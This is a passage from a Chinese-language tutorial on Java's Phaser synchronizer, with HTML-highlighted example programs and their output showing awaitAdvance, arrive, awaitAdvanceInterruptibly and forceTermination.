<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">3</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">1</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">false</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 part one all done
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">3</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">1</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">false</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 part one all done
【main】 part one all done
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="仅完成监控任务：awaitAdvance">仅完成监控任务：awaitAdvance</h2>
<p>awaitAdvance方法 不占用 <code>party</code> 数量，在所有parties全部完成后执行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 仅完成监控任务：awaitAdvance
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample7</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 若将phaser的parties注册为3，程序会加入阻塞状态</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">actionArriveAndAwaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">actionArriveAndAwaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            phaser<span class="token punctuation">.</span><span class="token function">awaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 监听到指定phase的parties全部完成后执行</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"all parties finished："</span> <span class="token operator">+</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">actionArriveAndAwaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">actionArriveAndAwaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            phaser<span class="token punctuation">.</span><span class="token function">awaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 监听到指定phase的parties全部完成后执行</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"all parties finished："</span> <span class="token operator">+</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】"</span> <span class="token operator">+</span> <span class="token string">" done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Thread</span> <span class="token function">actionArriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSecondsRandom</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】"</span> <span class="token operator">+</span> <span class="token string">" done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">all parties finished：<span class="token number">1</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 done
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 done
all parties finished：<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 done
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>配合<code>arrive</code>使用</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>phaser</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 测试 利用 {@link java.util.concurrent.Phaser#awaitAdvance} 监控所有party完成指定任务，才允许后续操作
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample8</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">AwaitAdvanceTask</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        phaser<span class="token punctuation">.</span><span class="token function">awaitAdvance</span><span class="token punctuation">(</span>phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 all part one finished."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">AwaitAdvanceTask</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">AwaitAdvanceTask</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 需要监控完成的工作</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"part one"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            phaser<span class="token punctuation">.</span><span class="token function">arrive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 非阻塞等待，完成其他工作</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"part two"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token class-name">String</span> actionName<span class="token punctuation">,</span> <span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 start "</span> <span class="token operator">+</span> actionName <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 finish  "</span> <span class="token operator">+</span> actionName <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 start part one<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 start part one<span class="token punctuation">.</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  part one<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 start part two<span class="token punctuation">.</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  part one<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 start part two<span class="token punctuation">.</span>
【main】 all part one finished<span class="token punctuation">.</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  part two<span class="token punctuation">.</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  part two<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="打断-超时-终止：awaitAdvanceInterruptibly">打断/超时 终止：awaitAdvanceInterruptibly</h2>
<p>等待此Phaser的阶段从给定的phase值前进，如果在等待期间被中断，则抛出 InterruptedException，或者如果当前phase不等于给定的phase值或此Phaser终止，则立即返回。</p>
<p><code>Phaser.awaitAdvanceInterruptibly(int)</code> ，调用interrupt，抛出InterruptedException</p>
<p><code>Phaser.awaitAdvanceInterruptibly(int, long, TimeUnit)</code>: 调用interrupt/给定超时时间，抛出InterruptedException</p>
<ul>
<li>
<p>不占用 <code>party</code> 数量，在所有parties全部完成后执行</p>
</li>
<li>
<p>打断了其中一个<code>party</code>，其他的 party 仍然能够继续执行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample9</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> finishTime <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token comment">// phase未结束，可以被打断，其他的 party 仍然能够继续执行</span>
    <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> waitTimeBeforeInterrupt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token comment">// phase已结束，不会抛出打断异常</span>
    <span class="token comment">//final static int waitTimeBeforeInterrupt = 4;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span>finishTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 允许被打断的await</span>
                phaser<span class="token punctuation">.</span><span class="token function">awaitAdvanceInterruptibly</span><span class="token punctuation">(</span>phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": 未完成party数："</span> <span class="token operator">+</span> phaser<span class="token punctuation">.</span><span class="token function">getUnarrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span>waitTimeBeforeInterrupt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> 未完成party数：<span class="token number">2</span>
<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>InterruptedException</span>
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span>Phaser</span><span class="token punctuation">.</span><span class="token function">awaitAdvanceInterruptibly</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">760</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>phaser<span class="token punctuation">.</span></span>PhaserExample9</span><span class="token punctuation">.</span>lambda$main$<span class="token function">2</span><span class="token punctuation">(</span><span class="token class-name">PhaserExample9</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">748</span><span class="token punctuation">)</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">continue<span class="token punctuation">.</span></span>
Thread</span><span class="token operator">-</span><span class="token number">0</span><span class="token operator">:</span> <span class="token keyword">continue</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="强制销毁：forceTermination">强制销毁：forceTermination</h2>
<p>强制此Phaser进入终止状态。注册方的数量不受影响。如果此Phaser是分层Phaser集的成员，则该集中的所有Phaser都将终止。如果此Phaser已终止，则此方法无效。</p>
<p>此方法可用于在一个或多个任务遇到意外异常后协调恢复。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample10</span> <span class="token punctuation">{</span>
